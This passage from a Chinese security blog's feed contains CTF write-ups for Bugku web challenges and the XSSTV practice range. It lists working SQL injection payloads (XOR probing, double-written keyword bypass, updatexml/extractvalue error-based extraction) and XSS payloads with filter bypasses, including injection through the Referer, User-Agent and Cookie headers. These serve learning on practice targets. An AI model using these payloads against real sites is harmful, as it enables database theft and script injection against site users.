title="Trim的日记本"></a>Trim的日记本</h2><blockquote><p><a href="http://120.24.86.145:9002/" target="_blank" rel="noopener">http://120.24.86.145:9002/</a> </p><p>hints：不要一次就放弃 </p></blockquote><p>注册一个用户，但是不知道id</p><p>后来用扫描器扫一扫</p><p>发现show.php</p><p>show.php即可发现flag</p><blockquote><p>flag1:{0/m9o9PDtcSyu7Tt} </p></blockquote><h2 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h2><blockquote><p>地址：<a href="http://120.24.86.145:8002/flagphp/" target="_blank" rel="noopener">http://120.24.86.145:8002/flagphp/</a></p><p>点了login咋没反应</p><p>提示：hint</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">$cookie = $_COOKIE[<span class="string">'ISecer'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'hint'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (unserialize($cookie) === <span class="string">"$KEY"</span>)</span><br><span class="line">&#123;   </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"$flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span><br><span class="line">&lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">&lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"admin.css"</span> type=<span class="string">"text/css"</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;div class="container" align="center"&gt;</span><br><span class="line">  &lt;form method=<span class="string">"POST"</span> action=<span class="string">"#"</span>&gt;</span><br><span class="line">    &lt;p&gt;&lt;input name=<span class="string">"user"</span> type=<span class="string">"text"</span> placeholder=<span class="string">"Username"</span>&gt;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;&lt;input name=<span class="string">"password"</span> type=<span class="string">"password"</span> placeholder=<span class="string">"Password"</span>&gt;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;&lt;input value=<span class="string">"Login"</span> type=<span class="string">"button"</span>/&gt;&lt;/p&gt;</span><br><span class="line">  &lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br><span class="line">$KEY=<span class="string">'ISecer:www.isecer.com'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>flag{unserialize_by_virink}</p></blockquote><h2 id="多次"><a href="#多次" class="headerlink" title="多次"></a>多次</h2><p>这里学到一种新的注入方式异或注入 </p><p> id后面输入 <code>1’^(0)^’</code>，此时页面正常返回，如果换一下 <code>‘^(1)^’</code>，此时则会返回错误，那么接下来我们就可以试一下页面究竟过滤了那些关键字。</p><p>比如 <code>1’^(length(‘select’)=6)^’</code>  测试这个<code>select</code>应该是被过滤的了，实现的语句应该是<code>id=1&#39;^0^0</code>,有过滤返回正确，而无过滤的时候就会返回错误  测试得到以下关键字被过滤 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union,select,and,or</span><br></pre></td></tr></table></figure><p>尝试一下是否可以双写绕过</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1531366090308.png" alt="1531366090308"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1531366077987.png" alt="1531366077987"></p><p>可以绕过，然后就是常规操作了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">id=-1&apos; uunionnion selecselectt 1,2 %23</span><br><span class="line"></span><br><span class="line">?id=-1&apos; uunionnion selecselectt 1,group_concat(table_name) from infoorrmation_schema.tables where  table_schema = database()%23</span><br><span class="line"></span><br><span class="line">?id=-1&apos; uunionnion selecselectt 1,group_concat(column_name) from infoorrmation_schema.columns where  table_schema = database()%23</span><br><span class="line"></span><br><span class="line">?id=-1&apos; uunionnion selecselectt 1,group_concat(flag1,&apos;-----&apos;,address) from flag1%23</span><br></pre></td></tr></table></figure><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1531366477264.png" alt="1531366477264"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1531366544753.png" alt="1531366544753"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1531366968042.png" alt="1531366968042"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1531366990699.png" alt="1531366990699"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1531366793474.png" alt="1531366793474"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1531367083835.png" alt="1531367083835"></p><p>payload</p><blockquote><p><a href="http://120.24.86.145:9004/1ndex.php?id=1&#39;" target="_blank" rel="noopener">http://120.24.86.145:9004/1ndex.php?id=1&#39;</a> anandd 1=2 uniounionn selecselectt 1,flag1 from flag1%23</p></blockquote><p>假的flag</p><blockquote><p>usOwycTju+FTUUzXosjr </p></blockquote><p>第二关</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select limit from and or where if sleep substr ascii</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">My Id =1&apos; select limit from and or where if ascii</span><br></pre></td></tr></table></figure><p>过滤了union ，sleep，substr</p><p>有回显，而且过滤了union，双写不能绕过，可以试一下报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and updatexml(1,concat(0x0a,(select database()),0x0a),1)%23</span><br><span class="line">?id=1&apos; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23</span><br><span class="line">?id=1&apos; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=flag2),0x7e),1)%23</span><br><span class="line">?id=1&apos; and updatexml(1,concat(0x7e,(select flag2 from flag2),0x7e),1)%23</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and extractvalue(1,concat(0x0a,(select database()),0x0a))%23</span><br><span class="line"></span><br><span class="line">?id=1&apos; and extractvalue(1,concat(0x0a,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x0a))%23</span><br><span class="line"></span><br><span class="line">?id=1&apos; and extractvalue(1,concat(0x0a,(select group_concat(column_name) from information_schema.columns where table_name=&apos;flag2&apos;),0x0a))%23</span><br><span class="line"></span><br><span class="line">?id=1&apos; and extractvalue(1,concat(0x0a,(select group_concat(flag2,address) from flag2),0x0a))%23</span><br></pre></td></tr></table></figure><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1531385520901.png" alt="1531385520901"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1531385615843.png" alt="1531385615843"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1531385664757.png" alt="1531385664757"></p><p>flag</p><blockquote><p>flag{bugku-sql_6s-2i-4t-bug} </p></blockquote><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>一是通过异或注入判断过滤的关键字，二是在union被过滤的情况之下要想到报错注入的方式 </p><p>参考</p><p><a href="https://blog.csdn.net/u011377996/article/details/79340100#t17" target="_blank" rel="noopener">https://blog.csdn.net/u011377996/article/details/79340100#t17</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;慢慢刷了这么多题目，需要总结一下&lt;/p&gt;
    
    </summary>
    
      <category term="WriteUp" scheme="http://blog.Lhaihai.wang/categories/WriteUp/"/>
    
    
      <category term="web" scheme="http://blog.Lhaihai.wang/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>XSSTV挑战赛</title>
    <link href="http://blog.Lhaihai.wang/2018/07/10/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/"/>
    <id>http://blog.Lhaihai.wang/2018/07/10/XSSTV挑战赛/</id>
    <published>2018-07-10T13:11:11.000Z</published>
    <updated>2018-07-16T10:46:46.131Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/index.png" alt="img"> </p><h3 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h3><p>​    <a href="http://test.xss.tv" target="_blank" rel="noopener">http://test.xss.tv</a></p><p>​    也可以自己搭在本地搭建</p><p>​    链接: <a href="https://pan.baidu.com/s/1xEZl3OiBw1l_goWzrbf4tw" target="_blank" rel="noopener">https://pan.baidu.com/s/1xEZl3OiBw1l_goWzrbf4tw</a> 密码: akvp</p><h3 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h3><p>​    firefox   61版本</p><p>​    chrome 67版本</p><p>​    burpsuite</p><a id="more"></a><h3 id="常见payload"><a href="#常见payload" class="headerlink" title="常见payload"></a>常见payload</h3><h3 id="判断核心字符是否被过滤"><a href="#判断核心字符是否被过滤" class="headerlink" title="判断核心字符是否被过滤"></a>判断核心字符是否被过滤</h3><p>关键字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;, &gt; # 构造标签</span><br><span class="line">&quot;, &apos; # 闭合属性</span><br><span class="line">&amp;, #, ; # HTML16编码</span><br></pre></td></tr></table></figure><h4 id="绕过的思路"><a href="#绕过的思路" class="headerlink" title="绕过的思路"></a>绕过的思路</h4><ol><li>大小写混淆</li><li>递归构造</li></ol><h3 id="辅助挖掘"><a href="#辅助挖掘" class="headerlink" title="辅助挖掘"></a>辅助挖掘</h3><p>判断过滤payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;&gt;&quot;&apos;zxcv # 还可以加上宽字节</span><br><span class="line">script</span><br><span class="line">href</span><br><span class="line">oninput</span><br><span class="line">&quot;&apos;%&amp;#&gt;&lt;/script&gt;&lt;p class=&quot;onmouseover=&quot; onmouseover=&quot;xx&quot; onxxx=&quot;&quot;&gt;location_beacon&lt;/p&gt;</span><br><span class="line">&apos; &quot;&gt;&lt;img src=x onerror=alert(2) x=</span><br></pre></td></tr></table></figure><p>构造标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">test&quot;&gt;&lt;script&gt;confirm(&quot;XssHere&quot;)&lt;/script&gt;</span><br><span class="line">test&quot;&gt;&lt;script&gt;prompt(&quot;XssHere&quot;)&lt;/script&gt;</span><br><span class="line">test&quot;&gt;&lt;script&gt;alert(&quot;XssHere&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>输入点位于属性内，基于事件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&apos; oninput=alert`1` //</span><br><span class="line">&apos; oninput=alert`1` &apos;</span><br><span class="line">&apos; onchange=alert`1` //</span><br><span class="line">&apos; onchange=alert`1` &apos;</span><br></pre></td></tr></table></figure><p>输入点位于属性内， 截断属性，构造标签(script标签 或者 a标签)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;a href=&quot;javascript:%61lert(1)&quot;&gt;click me&lt;/a&gt; //</span><br><span class="line">&quot;&gt; &lt;a href=&quot;javascript:alert(&apos;xss&apos;)&quot;&gt;111&lt;/a&gt; //</span><br><span class="line">&quot;&gt; &lt;a href=&quot;javascript:alert(/1/)&quot;&gt;axxx&lt;/a&gt; //</span><br></pre></td></tr></table></figure><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>先测试一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword=&lt;script&gt;alter(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>没反应，查看下源代码</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531185966173.png" alt="1531185966173"></p><p>有两个输出点，h2标签转义了 <code>&lt; ，&gt;</code> 但是下面的input没有过滤</p><p><code>&gt;</code>闭合了input标签，然后加了一个能触发alert的属性就行了。 </p><p>payload</p><blockquote><p>onchange=alert(1)&gt;</p></blockquote><p>弹出成功后查看一下源代码，觉得有点不对劲</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531186231555.png" alt="1531186231555"></p><p>加上双引号闭合，但是没有弹出,发现后面有个 <code>&quot;&gt;</code>，用br闭合一下</p><blockquote><p>“onchange=alert(1)&gt;</p></blockquote><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531187914573.png" alt="1531187914573"></p><blockquote><p>“onchange=alert(1)&gt; &lt;br “=</p></blockquote><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531210310583.png" alt="1531210310583"></p><h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531188126212.png" alt="1531188126212"></p><p>两个输出点都转义了<code>&gt; &lt;</code>，</p><p>跟第二关一样试试加属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;onchange=alert(1)</span><br></pre></td></tr></table></figure><p>发现不知道为啥多了个单引号，闭合一下</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531188797086.png" alt="1531188797086"></p><p>done</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531210569856.png" alt="1531210569856"></p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;onchange=alert(1) &apos;=&quot;</span><br></pre></td></tr></table></figure><h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;onchange=alert(1) &apos;=&apos;</span><br></pre></td></tr></table></figure><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531189584721.png" alt="1531189584721"></p><h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p>都被安排上了，插入了一个<code>_</code></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531190264025.png" alt="1531190264025"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531190312735.png" alt="1531190312735"></p><p>试试expression</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;img style=&quot;xss:expression(alert)&quot;&gt;</span><br></pre></td></tr></table></figure><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531190498640.png" alt="1531190498640"></p><p>再试试href</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531190680844.png" alt="1531190680844"></p><p>后面多了个 <code>&quot;&gt;</code>  ，继续加个标签闭合一下</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531191833992.png" alt="1531191833992"> </p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;a href=&quot;javascript:alert(1)&quot;&gt;click me&lt;/a&gt;&lt;br &quot;=</span><br></pre></td></tr></table></figure><h3 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h3><p>此处的防御大概如下</p><p> href 转换为 <code>hr_ef</code> </p><p>on 替换为 <code>o_n</code> </p><p>然而只要切换大小写就可以绕过转换。 </p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;a Href=&quot;javascript:alert(1)&quot;&gt;click me&lt;/a&gt;</span><br></pre></td></tr></table></figure><h3 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h3><p>script被删掉，试一下双写</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531192980682.png" alt="1531192980682"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531192933603.png" alt="1531192933603"></p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;sscriptcript&gt;alert(1)&lt;/sscriptcript&gt;</span><br></pre></td></tr></table></figure><h3 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h3><p>javascript  加了个 <code>_</code> ，使用HTML实体字符绕过</p><p> HTML16编码 </p><p>HTML10编码 </p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531193524450.png" alt="1531193524450"></p><p>输入之后点一下友情链接</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javasc&amp;#x0072;ipt:alert(1)</span><br><span class="line">javasc&amp;#x0072;ipt:alert`1`</span><br></pre></td></tr></table></figure><h3 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h3><p>刚开始以为只有input一个输出点（其实input根本不是输出点），href才是真的输出点，后来发现是要加上 http，要不然检测为不合法链接不给过</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531197569667.png" alt="1531197569667"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531197938265.png" alt="1531197938265"></p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javasc&amp;#x72;ipt:alert(1)//http://blog</span><br></pre></td></tr></table></figure><h3 id="0xA"><a href="#0xA" class="headerlink" title="0xA"></a>0xA</h3><p>查看源代码发现有hidden，肯定有问题，一个一个试着能不能注入，发现t_sort可以传入参数</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531200156204.png" alt="1531200156204"></p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?t_link=&amp;t_history=&amp;t_sort=&quot; type=&quot;text&quot; onmouseover=alert`1` &quot;</span><br><span class="line">?t_link=&amp;t_history=&amp;t_sort=&quot; onclick=alert(0) type=&quot;submit&quot;</span><br></pre></td></tr></table></figure><h3 id="0xB"><a href="#0xB" class="headerlink" title="0xB"></a>0xB</h3><p>把input标签的hidden改为text，在出现的文本框随便输入，回车发现 t_ref 被传入值，查看网络发现</p><p>这个值就是请求头的referer</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531202233456.png" alt="1531202233456"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531202956515.png" alt="1531202956515"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531202795820.png" alt="1531202795820"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531202818908.png" alt="1531202818908"></p><p>firefox直接改不能在页面看出效果，burpsuite改一改</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531203705589.png" alt="1531203705589"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531203630224.png" alt="1531203630224"></p><h3 id="0xC"><a href="#0xC" class="headerlink" title="0xC"></a>0xC</h3><p>传user-agent的值</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531203770013.png" alt="1531203770013"></p><p>burpsuite改一改</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531203852396.png" alt="1531203852396"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531203895448.png" alt="1531203895448"></p><h3 id="0xD"><a href="#0xD" class="headerlink" title="0xD"></a>0xD</h3><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531204005063.png" alt="1531204005063"></p><p>抓个包 ，发现是Cookie的user，改一改</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531204040196.png" alt="1531204040196"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531204784499.png" alt="1531204784499"></p><h3 id="0xE"><a href="#0xE" class="headerlink" title="0xE"></a>0xE</h3><p>需要登录</p><h3 id="0xF"><a href="#0xF" class="headerlink" title="0xF"></a>0xF</h3><p>注意： 需要科学上网，因为<code>angular.min.js</code> 是用google的api引入</p><p>涉及到<code>AngularJS</code></p><p>简单来说，AngularJS 通过新的属性和表达式扩展了 HTML</p><p>源码中的<code>ng-include</code>即包含外部的 HTML 文件，文件名来自<code>src</code>参数，包含的内容将作为指定元素的子节点。</p><p>由于ng-include遵循SOP，所以我们可以选择包level 1：</p><p><img 